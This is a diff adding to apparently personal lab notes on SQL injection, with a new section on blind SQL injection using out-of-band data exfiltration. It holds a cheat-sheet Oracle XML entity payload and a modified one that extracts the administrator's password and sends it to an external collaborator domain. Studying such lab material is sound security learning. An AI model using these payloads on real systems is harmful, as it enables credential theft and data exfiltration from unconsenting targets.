@@ -57,3 +57,16 @@ pFNjoVuG3fnTFJ3a' AND CAST((SELECT 1) as int)--
 
 fc9v2vqq5gozv1cb0ibj
 
+<br>
+
+## Blind SQL injection with out-of-band data exfiltration
+
+<img width="1884" height="1148" alt="image" src="https://github.com/user-attachments/assets/dadc4fac-18dd-4bd3-b294-e1a2194e6fb4" />
+
+from cheat sheet payload
+
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+if modified 
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.wllh6tly37ddovjub4nsmrpft6zxnsbh.oastify.com/"> %remote;]>'),'/l') FROM dual)--
